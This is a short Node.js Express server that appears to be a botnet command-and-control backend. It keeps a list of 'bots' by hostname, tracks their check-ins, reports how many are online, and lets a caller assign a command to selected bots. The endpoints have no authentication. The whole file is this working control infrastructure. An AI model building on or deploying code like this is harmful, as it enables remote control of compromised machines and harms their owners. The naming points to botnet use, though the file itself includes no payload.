const express = require("express");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

let bots = [];

app.post("/api/bots", (req, res) => {
    const newBot = req.body;
    const existingIndex = bots.findIndex(b => b.hostname === newBot.hostname);
    
    if (existingIndex >= 0) {
        bots[existingIndex] = { ...bots[existingIndex], ...newBot, lastSeen: Date.now() };
    } else {
        bots.push({ ...newBot, lastSeen: Date.now(), registeredAt: Date.now() });
    }

    res.status(200).json({ success: true });
});

app.get("/api/bots", (req, res) => {
    bots = bots.filter(b => Date.now() - b.lastSeen < 300000);
    res.json({ online_bots: bots.length, bots });
});

app.post("/api/bots/command", (req, res) => {
    const { hostnames, command } = req.body;
    
    bots.forEach(bot => {
        if (hostnames.includes(bot.hostname)) {
            bot.command = command;
        }
    });

    res.status(200).json({ success: true });
});

module.exports = app;
